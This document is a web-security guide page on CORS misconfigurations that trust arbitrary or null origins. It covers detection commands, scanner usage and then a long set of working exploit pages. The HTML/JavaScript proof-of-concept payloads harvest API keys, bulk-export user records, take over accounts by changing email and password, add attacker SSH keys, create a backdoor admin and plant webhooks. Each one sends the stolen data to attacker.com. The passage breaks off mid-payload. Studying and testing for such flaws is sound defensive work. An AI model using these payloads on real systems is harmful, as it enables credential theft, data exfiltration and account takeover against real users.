---
title: CORS Trusting Arbitrary Origins
description: Cross-Origin Resource Sharing misconfigurations where servers reflect or trust arbitrary Origin headers, enabling cross-origin data theft, credential harvesting, and account takeover chains.
navigation:
  icon: i-lucide-globe-lock
  title: CORS Trusting Arbitrary Origins
---

## Attack Theory

CORS misconfiguration occurs when a server dynamically reflects the `Origin` request header into the `Access-Control-Allow-Origin` response header without proper validation. When combined with `Access-Control-Allow-Credentials: true`, an attacker-controlled origin can read authenticated responses cross-origin, effectively bypassing the Same-Origin Policy.

::callout{icon="i-lucide-flame" color="red"}
**Core Principle:** If a server responds to an attacker-controlled `Origin` with `Access-Control-Allow-Origin: https://attacker.com` and `Access-Control-Allow-Credentials: true`, any authenticated data accessible via that endpoint is fully compromised. The browser will attach cookies and the attacker page can read the response.
::

### CORS Request Flow

```text [Normal CORS Flow]
┌──────────────┐                    ┌─────��────────────┐
│   Browser    │                    │   Target Server  │
│ (victim on   │                    │  api.target.com  │
│ attacker.com)│                    │                  │
└──────┬───────┘                    └────────┬─────────┘
       │                                     │
       │  GET /api/me HTTP/1.1               │
       │  Host: api.target.com               │
       │  Origin: https://attacker.com       │
       │  Cookie: session=abc123             │
       │────────────────────────────────────▶│
       │                                     │
       │  HTTP/1.1 200 OK                    │
       │  Access-Control-Allow-Origin:       │
       │    https://attacker.com  ⚠️         │
       │  Access-Control-Allow-Credentials:  │
       │    true  ⚠️                         │
       │  {"email":"victim@corp.com",        │
       │   "role":"admin",                   │
       │   "api_key":"sk_live_xxx..."}       │
       │◀────────────────────────────────────│
       │                                     │
       │  JavaScript on attacker.com         │
       │  CAN READ this response! 💀        │
       │                                     │
```

```text [Preflight CORS Flow (Complex Requests)]
┌──────────────┐                    ┌──────────────────┐
│   Browser    │                    │   Target Server  │
└──────┬───────┘                    └────────┬─────────┘
       │                                     │
       │  OPTIONS /api/data HTTP/1.1         │
       │  Host: api.target.com               │
       │  Origin: https://attacker.com       │
       │  Access-Control-Request-Method:     │
       │    POST                             │
       │  Access-Control-Request-Headers:    │
       │    Content-Type, Authorization      │
       │────────────────────────────────────▶│
       │                                     │
       │  HTTP/1.1 200 OK                    │
       │  Access-Control-Allow-Origin:       │
       │    https://attacker.com             │
       │  Access-Control-Allow-Methods:      │
       │    GET, POST, PUT, DELETE           │
       │  Access-Control-Allow-Headers:      │
       │    Content-Type, Authorization      │
       │  Access-Control-Allow-Credentials:  │
       │    true                             │
       │◀────────────────────────────────────│
       │                                     │
       │  POST /api/data HTTP/1.1            │
       │  Host: api.target.com               │
       │  Origin: https://attacker.com       │
       │  Cookie: session=abc123             │
       │  Content-Type: application/json     │
       │  {"action":"export_all_data"}       │
       │────────────────────────────────────▶│
       │                                     │
       │  HTTP/1.1 200 OK                    │
       │  Access-Control-Allow-Origin:       │
       │    https://attacker.com             │
       │  Access-Control-Allow-Credentials:  │
       │    true                             │
       │  {"data":[...all sensitive data...]}│
       │◀────────────────────────────────────│
       │                                     │
       │  attacker.com reads response ✅     │
```

```text [CORS Misconfiguration Impact Hierarchy]
┌────────────────────────────────────────────────────────────────┐
│             CORS Misconfiguration Severity                     │
│                                                                │
│  CRITICAL: Reflect Origin + Credentials: true                  │
│  ├── Any origin can read authenticated responses               │
│  ├── Full account data theft                                   │
│  ├── API key / token extraction                                │
│  ├── CSRF with response reading                                │
│  └── Complete SOP bypass                                       │
│                                                                │
│  HIGH: Reflect Origin + No Credentials                         │
│  ├── Read non-authenticated responses cross-origin             │
│  ├── Internal API data exposure                                │
│  ├── Information disclosure                                    │
│  └── May chain with token-based auth                           │
│                                                                │
│  HIGH: null Origin Trusted + Credentials: true                 │
│  ├── Sandboxed iframe bypass (data:, blob:, file:)             │
│  ├── Same as arbitrary origin via iframe                       │
│  └── Exploitable from local HTML files                         │
│                                                                │
│  MEDIUM: Regex Bypass + Credentials: true                      │
│  ├── Subdomain matching bypass                                 │
│  ├── Suffix matching bypass                                    │
│  ├── Prefix matching bypass                                    │
│  └── Requires attacker domain matching pattern                 │
│                                                                │
│  MEDIUM: Wildcard (*) + No Credentials                         │
│  ├── Any origin can read (but no cookies sent)                 │
│  ├── Information disclosure for public-ish data                │
│  └── May expose internal API structure                         │
│                                                                │
│  LOW: Pre-domain Wildcard (*.target.com)                       │
│  ├── Requires subdomain takeover or XSS on subdomain           │
│  └── Limited to trusted subdomain compromise                   │
└────────────────────────────────────────────────────────────────┘
```

### Misconfiguration Types at a Glance

::field-group

::field{name="Arbitrary Origin Reflection" type="critical"}
Server reflects any `Origin` header value into `Access-Control-Allow-Origin` verbatim. Combined with `Access-Control-Allow-Credentials: true`, this is the most severe CORS misconfiguration — any website can read authenticated responses.
::

::field{name="null Origin Trusted" type="high"}
Server responds with `Access-Control-Allow-Origin: null` when receiving `Origin: null`. Exploitable via sandboxed iframes, `data:` URIs, `file:` protocol, and redirected requests. Effectively equivalent to arbitrary origin trust.
::

::field{name="Regex / Pattern Bypass" type="high"}
Server validates the Origin but uses weak regex or substring matching. Bypassed via crafted domains like `attackertarget.com`, `target.com.attacker.com`, or `target.com%60attacker.com`.
::

::field{name="Wildcard with Subdomain" type="medium"}
Server trusts `*.target.com`. Exploitable if attacker can find XSS on any subdomain, perform subdomain takeover, or control a subdomain via dangling DNS.
::

::field{name="Wildcard (*) Without Credentials" type="low"}
`Access-Control-Allow-Origin: *` without credentials. Cannot read authenticated data but may expose internal API responses, error messages, or stack traces.
::

::

---

## Reconnaissance & Detection

### Manual Origin Header Testing

::tabs

:::tabs-item{icon="i-lucide-terminal" label="curl"}

```bash [Arbitrary Origin Reflection Test]
# Basic arbitrary origin test
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" | grep -i "access-control"

# With cookies/authentication
curl -s https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -D - -o /dev/null | grep -i "access-control"

# Full response with headers
curl -v https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" 2>&1 | grep -iE "access-control|< HTTP"

# Test with different attacker origins
for origin in "https://evil.com" "https://attacker.com" "https://hacker.xyz" "https://test.example.com"; do
  echo "=== Origin: $origin ==="
  curl -sI https://target.com/api/me \
    -H "Origin: $origin" \
    -H "Cookie: session=YOUR_SESSION_COOKIE" | grep -i "access-control"
  echo ""
done
```

```bash [null Origin Test]
# Test null origin trust
curl -sI https://target.com/api/me \
  -H "Origin: null" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" | grep -i "access-control"

# null with different casing
curl -sI https://target.com/api/me \
  -H "Origin: Null" | grep -i "access-control"

curl -sI https://target.com/api/me \
  -H "Origin: NULL" | grep -i "access-control"
```

```bash [Wildcard Test]
# Check for wildcard
curl -sI https://target.com/api/public \
  -H "Origin: https://anything.com" | grep -i "access-control-allow-origin"
# If response: Access-Control-Allow-Origin: * → wildcard

# Check if wildcard + credentials (invalid per spec but some servers do it)
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" | grep -iE "allow-origin|allow-credentials"
```

```bash [Preflight OPTIONS Test]
# Send preflight request
curl -sI -X OPTIONS https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Content-Type" | grep -i "access-control"

# Preflight with POST method
curl -sI -X OPTIONS https://target.com/api/data \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type, Authorization" | grep -i "access-control"

# Preflight with PUT/DELETE
curl -sI -X OPTIONS https://target.com/api/users/1 \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" | grep -i "access-control"
```

:::

:::tabs-item{icon="i-lucide-terminal" label="httpie"}

```bash [httpie CORS Testing]
# Basic test
http HEAD https://target.com/api/me Origin:https://evil.com

# With authentication
http HEAD https://target.com/api/me \
  Origin:https://evil.com \
  Cookie:session=YOUR_SESSION_COOKIE

# Full response
http https://target.com/api/me \
  Origin:https://evil.com \
  Cookie:session=YOUR_SESSION_COOKIE

# null origin
http HEAD https://target.com/api/me Origin:null
```

:::

:::tabs-item{icon="i-lucide-globe" label="Browser Console"}

```javascript [Browser-Based CORS Testing]
// Test from browser console on any site
// This tests if target reflects the current origin

// Simple GET
fetch('https://target.com/api/me', {
  credentials: 'include'
})
.then(r => {
  console.log('Status:', r.status);
  console.log('ACAO:', r.headers.get('access-control-allow-origin'));
  console.log('ACAC:', r.headers.get('access-control-allow-credentials'));
  return r.text();
})
.then(body => console.log('Body:', body))
.catch(e => console.error('CORS blocked:', e));

// Test with different methods
['GET', 'POST', 'PUT', 'DELETE', 'PATCH'].forEach(method => {
  fetch('https://target.com/api/me', {
    method: method,
    credentials: 'include'
  }).then(r => {
    console.log(`${method}: ${r.status} - ACAO: ${r.headers.get('access-control-allow-origin')}`);
  }).catch(e => {
    console.log(`${method}: BLOCKED`);
  });
});

// XMLHttpRequest test (different error handling)
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/me', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    console.log('Status:', xhr.status);
    console.log('Response:', xhr.responseText);
    console.log('Headers:', xhr.getAllResponseHeaders());
  }
};
xhr.send();
```

:::

::

### Comprehensive Origin Validation Testing

```bash [Origin Validation Bypass Tests]
#!/bin/bash
# Comprehensive CORS origin validation tester
TARGET="https://target.com/api/me"
COOKIE="session=YOUR_SESSION_COOKIE"

declare -A ORIGINS=(
  # Arbitrary origins
  ["Arbitrary Origin"]="https://evil.com"
  ["Another Arbitrary"]="https://attacker.com"
  ["Random Domain"]="https://hacker.xyz"
  
  # null origin
  ["null Origin"]="null"
  
  # Subdomain variations
  ["Subdomain Prefix"]="https://evil.target.com"
  ["Deep Subdomain"]="https://a.b.c.target.com"
  ["Hyphenated Sub"]="https://evil-target.com"
  
  # Suffix matching bypass
  ["Suffix Bypass"]="https://eviltarget.com"
  ["Suffix With Dot"]="https://evil.com.target.com"
  
  # Prefix matching bypass
  ["Prefix Bypass"]="https://target.com.evil.com"
  ["Prefix With Path"]="https://target.com%2f@evil.com"
  ["Prefix With Port"]="https://target.com:evil.com"
  
  # Protocol variations
  ["HTTP Origin"]="http://target.com"
  ["No Protocol"]="target.com"
  
  # Special characters
  ["Underscore"]="https://target_com.evil.com"
  ["Backtick"]="https://target.com%60evil.com"
  ["Pipe"]="https://target.com%7Cevil.com"
  ["Space"]="https://target.com%20evil.com"
  ["Tab"]="https://target.com%09evil.com"
  ["Null Byte"]="https://target.com%00evil.com"
  
  # Unicode/IDN
  ["Unicode"]="https://targеt.com"
  ["Punycode"]="https://xn--targt-wya.com"
  
  # Localhost variants
  ["Localhost"]="http://localhost"
  ["Localhost IP"]="http://127.0.0.1"
  ["IPv6 Localhost"]="http://[::1]"
  ["0.0.0.0"]="http://0.0.0.0"
  
  # Cloud metadata
  ["Metadata"]="http://169.254.169.254"
  
  # file and data
  ["File Protocol"]="file://"
  ["Data Protocol"]="data:"
  
  # Wildcard abuse
  ["With Port"]="https://evil.com:443"
  ["Different Port"]="https://target.com:8080"
)

echo "CORS Origin Validation Test — $TARGET"
echo "=================================================="
printf "%-25s | %-45s | %s\n" "Test Name" "Origin" "Result"
echo "=================================================="

for name in "${!ORIGINS[@]}"; do
  origin="${ORIGINS[$name]}"
  result=$(curl -s -o /dev/null -D - "$TARGET" \
    -H "Origin: $origin" \
    -H "Cookie: $COOKIE" 2>/dev/null | grep -i "access-control-allow-origin" | head -1 | tr -d '\r\n')
  
  if [ -n "$result" ]; then
    ACAO=$(echo "$result" | grep -oP ':\s*\K.*')
    CREDS=$(curl -s -o /dev/null -D - "$TARGET" \
      -H "Origin: $origin" \
      -H "Cookie: $COOKIE" 2>/dev/null | grep -i "access-control-allow-credentials" | head -1 | grep -oP ':\s*\K.*' | tr -d '\r\n')
    
    if echo "$ACAO" | grep -q "$origin\|evil\|attacker\|hacker\|null\|\*"; then
      printf "%-25s | %-45s | ⚠️  ACAO: %s | Creds: %s\n" "$name" "$origin" "$ACAO" "$CREDS"
    else
      printf "%-25s | %-45s | ✅ ACAO: %s\n" "$name" "$origin" "$ACAO"
    fi
  else
    printf "%-25s | %-45s | ✅ No ACAO header\n" "$name" "$origin"
  fi
done
```

### Multi-Endpoint CORS Scanning

```bash [Endpoint Discovery + CORS Test]
# Discover API endpoints then test each for CORS
# Step 1: Crawl/enumerate endpoints
ENDPOINTS=(
  "/api/me" "/api/user" "/api/profile" "/api/account"
  "/api/settings" "/api/keys" "/api/tokens" "/api/config"
  "/api/admin" "/api/users" "/api/data" "/api/export"
  "/api/v1/me" "/api/v2/user" "/api/graphql"
  "/userinfo" "/oauth/userinfo" "/.well-known/openid-configuration"
  "/wp-json/wp/v2/users" "/rest/api/latest/myself"
  "/api/internal/config" "/api/debug" "/api/health"
  "/graphql" "/api/v1/graphql" "/_api/v1/session"
)

TARGET="https://target.com"
ORIGIN="https://evil.com"
COOKIE="session=YOUR_SESSION_COOKIE"

echo "[*] Testing ${#ENDPOINTS[@]} endpoints for CORS misconfiguration"
echo "================================================================"

for endpoint in "${ENDPOINTS[@]}"; do
  RESP=$(curl -s -o /dev/null -w "%{http_code}" -D /tmp/cors_headers \
    "${TARGET}${endpoint}" \
    -H "Origin: $ORIGIN" \
    -H "Cookie: $COOKIE" 2>/dev/null)
  
  ACAO=$(grep -i "access-control-allow-origin" /tmp/cors_headers 2>/dev/null | head -1 | tr -d '\r\n')
  ACAC=$(grep -i "access-control-allow-credentials" /tmp/cors_headers 2>/dev/null | head -1 | tr -d '\r\n')
  
  if echo "$ACAO" | grep -qi "evil.com"; then
    echo "[+] VULNERABLE: ${endpoint} (HTTP ${RESP})"
    echo "    $ACAO"
    echo "    $ACAC"
  elif echo "$ACAO" | grep -qi "\*"; then
    echo "[~] WILDCARD: ${endpoint} (HTTP ${RESP})"
    echo "    $ACAO"
  elif [ "$RESP" != "000" ] && [ "$RESP" != "404" ]; then
    echo "[-] Safe: ${endpoint} (HTTP ${RESP})"
  fi
done

# Alternative: use gau/waybackurls for endpoint discovery
gau target.com | grep -i "/api/\|/rest/\|/graphql\|/v1/\|/v2/" | sort -u | head -50
waybackurls target.com | grep -i "/api/\|/rest/\|/graphql" | sort -u | head -50
```

### Automated Scanning Tools

::tabs

:::tabs-item{icon="i-lucide-scan" label="Corsy"}

```bash [Corsy — CORS Misconfiguration Scanner]
# Install
git clone https://github.com/s0md3v/Corsy.git
cd Corsy
pip3 install -r requirements.txt

# Single URL scan
python3 corsy.py -u https://target.com/api/me

# With custom headers (authentication)
python3 corsy.py -u https://target.com/api/me \
  -H "Cookie: session=YOUR_SESSION_COOKIE"

# Multiple URLs from file
python3 corsy.py -i urls.txt

# With threads
python3 corsy.py -i urls.txt -t 20

# Output to file
python3 corsy.py -u https://target.com/api/me -o results.json
```

:::

:::tabs-item{icon="i-lucide-scan" label="CORScanner"}

```bash [CORScanner]
# Install
git clone https://github.com/chenjj/CORScanner.git
cd CORScanner
pip3 install -r requirements.txt

# Single URL
python3 cors_scan.py -u https://target.com/api/me

# With custom headers
python3 cors_scan.py -u https://target.com/api/me \
  -H "Cookie: session=YOUR_SESSION_COOKIE"

# Multiple URLs
python3 cors_scan.py -i urls.txt

# Verbose output
python3 cors_scan.py -u https://target.com/api/me -v

# With threads
python3 cors_scan.py -i urls.txt -t 50

# Output
python3 cors_scan.py -i urls.txt -o output.json
```

:::

:::tabs-item{icon="i-lucide-scan" label="Nuclei"}

```bash [Nuclei CORS Templates]
# Built-in CORS templates
nuclei -u https://target.com -tags cors

# Specific CORS templates
nuclei -u https://target.com -t http/misconfiguration/cors/

# With list of URLs
nuclei -l urls.txt -tags cors -o cors_results.txt

# With custom headers
nuclei -u https://target.com -tags cors \
  -H "Cookie: session=YOUR_SESSION_COOKIE"

# Verbose
nuclei -u https://target.com -tags cors -v

# Custom CORS template
cat << 'YAML' > cors-arbitrary-origin.yaml
id: cors-arbitrary-origin

info:
  name: CORS Arbitrary Origin Reflection
  severity: high
  tags: cors,misconfig

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: https://evil.com
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"
    extractors:
      - type: kv
        part: header
        kv:
          - Access-Control-Allow-Origin
          - Access-Control-Allow-Credentials
          - Access-Control-Allow-Methods
          - Access-Control-Allow-Headers
YAML

nuclei -u https://target.com/api/me -t cors-arbitrary-origin.yaml
```

:::

:::tabs-item{icon="i-lucide-scan" label="Burp Suite"}

```text [Burp Suite CORS Testing]
1. Passive Detection:
   - Scanner automatically flags CORS headers
   - Check "Issues" for "Cross-origin resource sharing: arbitrary origin trusted"
   - Review "Target > Site map" for ACAO headers

2. Active Testing via Repeater:
   - Send request to Repeater
   - Add: Origin: https://evil.com
   - Check response for ACAO reflection
   - Test with: Origin: null
   - Test regex bypasses

3. Intruder — Origin Fuzzing:
   - Position: Origin header value
   - Payload: list of bypass origins
   - Grep match: "Access-Control-Allow-Origin"
   - Grep match: "evil" or payload markers

4. Extensions:
   - "CORS* - Additional CORS Checks" (BApp Store)
   - "CORS Turbo Intruder" 
   - "Logger++" to log all CORS headers

5. Match & Replace:
   - Add rule: Replace request header
   - Match: ^Origin:.*$
   - Replace: Origin: https://evil.com
   - Now ALL requests test for CORS reflection
```

:::

:::tabs-item{icon="i-lucide-scan" label="ffuf / curl Mass"}

```bash [ffuf CORS Fuzzing]
# Fuzz endpoints for CORS misconfiguration
ffuf -u "https://target.com/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -mc 200 \
  -mr "Access-Control-Allow-Origin: https://evil.com" \
  -o cors_vuln.json

# Fuzz with origin wordlist
ffuf -u "https://target.com/api/me" \
  -w origins.txt:ORIGIN \
  -H "Origin: ORIGIN" \
  -H "Cookie: session=YOUR_SESSION_COOKIE" \
  -mc 200 \
  -mr "Access-Control-Allow-Origin" \
  -o origin_test.json

# Mass curl test across URLs
cat urls.txt | while read url; do
  ACAO=$(curl -sI "$url" -H "Origin: https://evil.com" | grep -i "access-control-allow-origin" | head -1)
  [ -n "$ACAO" ] && echo "[+] $url — $ACAO"
done
```

:::

::

---

## Exploitation — Arbitrary Origin Reflection

### Confirming the Vulnerability

```bash [Confirm Arbitrary Origin + Credentials]
# Step 1: Verify origin reflection
curl -sI https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=VALID_SESSION" | grep -i "access-control"

# Expected vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# Step 2: Verify response contains sensitive data
curl -s https://target.com/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=VALID_SESSION"

# Step 3: Verify without cookies (baseline)
curl -s https://target.com/api/me \
  -H "Origin: https://evil.com"
# Should get 401/403 or empty response (confirms credentials are needed)
```

### Basic Exploitation PoC

::tabs

:::tabs-item{icon="i-lucide-code" label="fetch API"}

```html [fetch — Basic PoC (exploit.html)]
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Exploitation PoC</h1>
<div id="output">Loading...</div>
<script>
fetch('https://target.com/api/me', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  document.getElementById('output').textContent = JSON.stringify(data, null, 2);
  
  // Exfiltrate to attacker server
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
})
.catch(error => {
  document.getElementById('output').textContent = 'Error: ' + error;
});
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-code" label="XMLHttpRequest"}

```html [XMLHttpRequest — Basic PoC]
<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/me', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    // Send stolen data to attacker
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'https://attacker.com/collect', true);
    exfil.setRequestHeader('Content-Type', 'application/json');
    exfil.send(xhr.responseText);
  }
};
xhr.send();
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-code" label="Image Beacon"}

```html [Image Beacon Exfil]
<!DOCTYPE html>
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/me', true);
xhr.withCredentials = true;
xhr.onload = function() {
  // Exfiltrate via image beacon (no CORS needed for outbound)
  new Image().src = 'https://attacker.com/collect?data=' + 
    encodeURIComponent(btoa(xhr.responseText));
};
xhr.send();
</script>
</body>
</html>
```

:::

::

### Advanced Exploitation Payloads

::tabs

:::tabs-item{icon="i-lucide-key" label="API Key / Token Theft"}

```html [API Key Extraction]
<!DOCTYPE html>
<html>
<body>
<script>
// Multi-endpoint harvesting
const endpoints = [
  '/api/me',
  '/api/profile',
  '/api/settings',
  '/api/keys',
  '/api/tokens',
  '/api/account',
  '/api/v1/user/api-keys',
  '/api/v2/integrations',
  '/api/billing',
  '/api/organization'
];

const stolen = {};

async function harvest() {
  for (const ep of endpoints) {
    try {
      const resp = await fetch('https://target.com' + ep, {
        credentials: 'include'
      });
      if (resp.ok) {
        const data = await resp.json();
        stolen[ep] = data;
      }
    } catch(e) {
      stolen[ep] = 'error: ' + e.message;
    }
  }
  
  // Exfiltrate everything
  navigator.sendBeacon('https://attacker.com/harvest', JSON.stringify(stolen));
}

harvest();
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-user" label="Full Account Takeover"}

```html [Account Takeover Chain]
<!DOCTYPE html>
<html>
<body>
<script>
async function accountTakeover() {
  // Step 1: Steal user data
  const userResp = await fetch('https://target.com/api/me', {
    credentials: 'include'
  });
  const user = await userResp.json();
  
  // Step 2: Extract CSRF token if present
  const settingsResp = await fetch('https://target.com/settings', {
    credentials: 'include'
  });
  const settingsHtml = await settingsResp.text();
  const csrfMatch = settingsHtml.match(/csrf[_-]?token[^'"]*['"]([^'"]+)/i);
  const csrf = csrfMatch ? csrfMatch[1] : '';
  
  // Step 3: Change email to attacker's
  await fetch('https://target.com/api/settings/email', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: 'attacker@evil.com',
      csrf_token: csrf
    })
  });
  
  // Step 4: Generate new API key
  const keyResp = await fetch('https://target.com/api/keys/generate', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'backup', csrf_token: csrf })
  });
  const newKey = await keyResp.json();
  
  // Step 5: Exfiltrate everything
  fetch('https://attacker.com/ato', {
    method: 'POST',
    body: JSON.stringify({
      user: user,
      csrf: csrf,
      new_api_key: newKey,
      timestamp: new Date().toISOString()
    })
  });
}

accountTakeover();
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-database" label="Bulk Data Exfiltration"}

```html [Paginated Data Exfiltration]
<!DOCTYPE html>
<html>
<body>
<script>
async function exfiltrateAll() {
  let allData = [];
  let page = 1;
  let hasMore = true;
  
  while (hasMore) {
    try {
      const resp = await fetch(
        `https://target.com/api/users?page=${page}&per_page=100`, {
        credentials: 'include'
      });
      
      if (!resp.ok) break;
      
      const data = await resp.json();
      
      if (data.users && data.users.length > 0) {
        allData = allData.concat(data.users);
        page++;
      } else {
        hasMore = false;
      }
    } catch(e) {
      hasMore = false;
    }
  }
  
  // Chunk and send (avoid request size limits)
  const chunkSize = 50;
  for (let i = 0; i < allData.length; i += chunkSize) {
    const chunk = allData.slice(i, i + chunkSize);
    await fetch('https://attacker.com/data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chunk: Math.floor(i/chunkSize) + 1,
        total: Math.ceil(allData.length/chunkSize),
        records: chunk
      })
    });
    // Delay to avoid rate limiting
    await new Promise(r => setTimeout(r, 500));
  }
}

exfiltrateAll();
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-shield-alert" label="Admin Panel Extraction"}

```html [Admin Panel Data Theft]
<!DOCTYPE html>
<html>
<body>
<script>
async function stealAdminData() {
  const targets = {
    users: '/api/admin/users',
    roles: '/api/admin/roles',
    config: '/api/admin/config',
    logs: '/api/admin/audit-logs',
    secrets: '/api/admin/secrets',
    env: '/api/admin/environment',
    db_config: '/api/admin/database',
    integrations: '/api/admin/integrations',
    webhooks: '/api/admin/webhooks',
    api_keys: '/api/admin/api-keys'
  };
  
  const results = {};
  
  for (const [name, path] of Object.entries(targets)) {
    try {
      const resp = await fetch('https://target.com' + path, {
        credentials: 'include'
      });
      if (resp.ok) {
        results[name] = await resp.json();
      } else {
        results[name] = { status: resp.status, statusText: resp.statusText };
      }
    } catch(e) {
      results[name] = { error: e.message };
    }
  }
  
  // Send via multiple methods for reliability
  fetch('https://attacker.com/admin-data', {
    method: 'POST',
    body: JSON.stringify(results)
  });
  
  // Backup: DNS exfil for confirmation
  new Image().src = 'https://cors-confirmed.attacker.com/ping';
}

stealAdminData();
</script>
</body>
</html>
```

:::

:::tabs-item{icon="i-lucide-git-branch" label="GraphQL Exploitation"}

```html [GraphQL via CORS]
<!DOCTYPE html>
<html>
<body>
<script>
async function exploitGraphQL() {
  // Introspection query
  const introspection = await fetch('https://target.com/graphql', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: '{ __schema { types { name fields { name type { name } } } } }'
    })
  });
  const schema = await introspection.json();
  
  // Extract user data
  const userData = await fetch('https://target.com/graphql', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: `{
        me {
          id email name role apiKey
          organization {
            id name members { id email role }
            billingInfo { cardLast4 plan }
          }
        }
      }`
    })
  });
  const data = await userData.json();
  
  // All users (if admin)
  const allUsers = await fetch('https://target.com/graphql', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      query: '{ users(first: 1000) { edges { node { id email name role apiKeys { key } } } } }'
    })
  });
  const users = await allUsers.json();
  
  fetch('https://attacker.com/graphql-exfil', {
    method: 'POST',
    body: JSON.stringify({ schema, data, users })
  });
}

exploitGraphQL();
</script>
</body>
</html>
```

:::

::

### State-Changing Operations via CORS

::warning
With `Access-Control-Allow-Credentials: true` and origin reflection, attackers can not only **read** data but also **write** — performing state-changing operations (POST, PUT, DELETE) while reading the response. This is CSRF with response reading, far more powerful than traditional CSRF.
::

::code-group

```html [Password Change]
<script>
// Change victim's password via CORS
fetch('https://target.com/api/account/password', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    new_password: 'attacker_password_123',
    confirm_password: 'attacker_password_123'
  })
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/pwchange', {
    method: 'POST',
    body: JSON.stringify({ result: d })
  });
});
</script>
```

```html [Add SSH Key / Deploy Key]
<script>
fetch('https://target.com/api/settings/keys', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    title: 'backup-key',
    key: 'ssh-rsa AAAAB3... attacker@evil.com'
  })
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/sshkey', {
    method: 'POST',
    body: JSON.stringify(d)
  });
});
</script>
```

```html [Create Admin User]
<script>
fetch('https://target.com/api/admin/users', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'backdoor_admin',
    email: 'admin@evil.com',
    password: 'Sup3rS3cret!',
    role: 'admin'
  })
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/admin-created', {
    method: 'POST',
    body: JSON.stringify(d)
  });
});
</script>
```

```html [Modify Webhook / Redirect]
<script>
// Add or modify webhook to exfiltrate future data
fetch('https://target.com/api/webhooks', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    url: 'https://attacker.com/webhook',
    events: ['*'],
    active: true,
    secret: 'attacker_secret'
  })
}).then(r => r.json()).then(d => {
  fetch('https://attacker.com/webhook-added', {
    method: 'POST',
    body: JSON.stringify(d)
  });
});
</script>
```

::

---

## Exploitation — null Origin

### null Origin Attack Vectors

::note
The `null` Origin is sent by browsers in several scenarios: sandboxed iframes, `data:` URIs, `file://` protocol, cross-origin redirects, and serialized `<form>` submissions with certain attributes. If the server trusts `Origin: null`, all these vectors become exploitable.
::

```text [null Origin Sources]
┌───────────────────────────────────────────────────────┐
│          Browser Sends Origin: null When:             │
│                                                       │
│  1. Sandboxed iframe (sandbox attribute)              │
│     <iframe sandbox="allow-scripts allow-forms"       │
│            src="data:text/html,...">                   │
│                                                       │
│  2. data: URI                                         │
│     <iframe src="data:text/html,<script>...</script>">│
│                                                       │
│  3. file:// protocol                                  │
│     Local HTML file opened in browser                 │
│                                                       │
│  4. Cross-origin redirect                             │
│     A → redirect → B (Origin becomes null)            │
│                                                       │
│  5. Certain browser extensions/contexts               │
│     Bookmarklets, browser-internal pages              │
│                                                       │
│  6. blob: URI in some browsers                        │
│     blob:null/guid                                    │
└───────────────────────────────────────────────────────┘
```

::tabs

:::tabs-item{icon="i-lucide-box" label="Sandboxed iframe"}

```html [Sandboxed iframe — null Origin Exploit]
<!DOCTYPE html>
<html>
<body>
<h1>CORS null Origin Exploit</h1>
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
